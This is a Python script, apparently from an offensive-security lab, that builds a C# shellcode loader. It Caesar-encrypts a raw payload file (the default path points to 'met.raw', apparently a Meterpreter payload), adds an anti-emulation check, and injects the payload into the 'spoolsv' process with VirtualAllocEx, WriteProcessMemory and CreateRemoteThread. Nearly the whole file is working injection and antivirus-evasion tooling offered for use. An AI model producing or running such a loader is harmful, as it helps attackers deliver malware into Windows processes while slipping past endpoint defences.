from concurrent.futures import process
from common.shellcode_formator import to_csharp_array
from common.encrypt_utils import EncryptUtils, Algorithm, Language
import sys


template = """
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
class Program
{
[DllImport("kernel32.dll")]
static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

[System.Runtime.InteropServices.DllImport("kernel32.dll")]
private static extern IntPtr GetCurrentProcess();

[DllImport("kernel32.dll")]
static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

static byte[] DecryptShellcode(byte[] enc, uint key)
{
byte[] buf = new byte[enc.Length];
for (int i = 0; i < enc.Length; i++)
{
buf[i] = (byte)(((uint)enc[i] - key) & 0xFF);
}
return buf;
}

static void Main(string[] args)
{

IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
if (mem == null)
{
    return;
}

byte[] encryptedShellcode = %(encrypted_shellcode)s;
byte[] buf = DecryptShellcode(encryptedShellcode, %(decryption_key)s);

Process[] expProc = Process.GetProcessesByName("%(process_name)s");
int pid = expProc[0].Id;

IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);

IntPtr outSize;
WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

}
}
}
"""


def read_shellcode_file(shellcode_fp):
    with open(shellcode_fp, 'rb') as f:
        return f.read()


def get_code(shellcode_path, process_name, key):
    shellcode = read_shellcode_file(shellcode_path)
    enc_utils = EncryptUtils(Algorithm.CAESAR, key)
    encrypted_shellcode = enc_utils.encrypt(shellcode)
    code = template % {
        'decryption_key': str(key),
        'encrypted_shellcode': to_csharp_array(encrypted_shellcode), 
        'process_name': process_name,
    }
    print(code)


shellcode_path = "/home/parallels/lab/clientside_exec/tmp/met.raw"
key = 7
process_name = 'spoolsv'
if len(sys.argv) > 1:
    shellcode_path = sys.argv[1]
    if len(sys.argv) > 2:
        key = int(sys.argv[2])
get_code(shellcode_path, process_name, key)
